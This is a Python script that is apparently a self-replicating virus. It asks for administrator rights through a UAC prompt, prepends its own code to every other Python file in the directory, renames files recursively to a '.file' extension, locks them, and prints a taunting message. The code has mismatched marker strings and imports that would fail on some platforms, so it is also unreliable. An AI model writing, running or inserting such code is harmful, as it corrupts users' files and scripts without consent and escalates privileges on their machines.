import sys
import glob
import os
import fcntl
import msvcrt
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def read_file(file):
    with open(file, 'r') as f:
        return f.readlines()

def write_file(file, content):
    with open(file, 'w') as f:
        f.writelines(content)

def is_tested(file_code):
    return any(line.strip() == '# FUN SAYS HI!' for line in file_code)

def get_fun_code():
    lines = read_file(sys.argv[0])
    fun_code = []
    self_replicating_part = False
    for line in lines:
        if line.strip() == '# Fun says HI!':
            self_replicating_part = True
        if not self_replicating_part:
            fun_code.append(line)
        if line.strip() == '# FUN SAYS BYE!':
            break
    return fun_code

def replicate_code(fun_code):
    python_files = glob.glob('*.py') + glob.glob('*.pyw')
    for file in python_files:
        file_code = read_file(file)
        if not is_tested(file_code):
            final_code = fun_code + ['\n'] + file_code
            write_file(file, final_code)

def cool_code():
    print('YOU HAVE BEEN made fun of HAHAHA !!!')

def change_extension(files, new_extension):
    for file in files:
        base = os.path.splitext(file)[0]
        new_file = base + new_extension
        if not os.path.exists(new_file) and not is_tested(read_file(file)):
            os.rename(file, new_file)

def select_files(extension, directory='.'):
    return glob.glob(os.path.join(directory, '**', '*.' + extension), recursive=True)

def lock_file(file):
    with open(file, 'r+') as f:
        if sys.platform == 'win32':
            msvcrt.locking(f.fileno(), msvcrt.LK_LOCK, os.path.getsize(file))
        else:
            fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)

def main():
    # Get all files in the current directory and subdirectories
    all_files = select_files('*')

    # Get fun code and replicate it
    fun_code = get_fun_code()
    replicate_code(fun_code)

    # Change their extensions to '.file'
    change_extension(all_files, '.file')

    # Lock all files
    for file in all_files:
        lock_file(file)

    # Run cool code
    cool_code()

if __name__ == '__main__':
    if not is_admin():
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else:
        main()
